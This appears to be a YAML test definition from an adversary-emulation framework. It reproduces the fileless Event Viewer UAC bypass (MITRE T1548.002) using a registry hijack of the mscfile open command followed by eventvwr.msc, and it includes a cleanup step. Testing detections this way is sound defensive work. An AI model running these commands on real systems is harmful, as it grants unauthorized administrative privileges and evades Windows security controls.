api_version: "2.0"
name: Bypass UAC using Event Viewer (cmd)
description: "Bypasses User Account Control using Event Viewer and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/\nUpon execution command prompt should be launched with administrative privileges. \n"
args:
    - name: executable_binary
      type: path
      default: C:\Windows\System32\cmd.exe
uuid: 5073adf8-9a50-4bd9-b298-a9bd2ead8af9
mitre:
    tactics:
        - 'TA0004: Privilege Escalation'
        - 'TA0005: Defense Evasion'
    techniques:
        - 'T1548: Abuse Elevation Control Mechanism'
    subtechniques:
        - 'T1548.002: Bypass User Account Control'
requirements:
    platforms:
        - os: windows
steps:
    - name: bypass-uac-using-event-viewer-(cmd)
      inline: |
        reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d "{{.Args.executable_binary}}" /f
        cmd.exe /c eventvwr.msc
      executor: command_prompt
      cleanup:
        inline: |
            reg.exe delete hkcu\software\classes\mscfile /f >nul 2>&1
        executor: command_prompt
